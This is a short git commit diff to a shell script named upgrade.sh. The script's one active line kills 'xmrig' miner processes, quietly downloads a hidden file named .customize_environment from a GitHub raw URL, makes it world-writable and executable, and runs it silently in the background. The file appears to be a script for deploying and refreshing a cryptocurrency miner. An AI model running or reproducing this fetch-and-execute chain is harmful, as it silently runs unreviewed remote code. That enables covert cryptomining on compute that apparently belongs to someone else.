4d70979e7cd16d76f353ee258302855158777f9e
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-08 13:08:11 -0300

    Update upgrade.sh

--- upgrade.sh
+++ upgrade.sh
@@ -2,7 +2,7 @@
 
 #if [ $2 == '0.1' ]
 #then
-   pkill xmrig ; pkill ping.sh ; pkill ./.customize_environment ; rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; nohup ./.customize_environment > /dev/null &
+   pkill xmrig ; pkill ping.sh ; pkill .customize_environment ; rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; nohup ./.customize_environment > /dev/null &
 #fi
 
 echo 'upgrade ok'
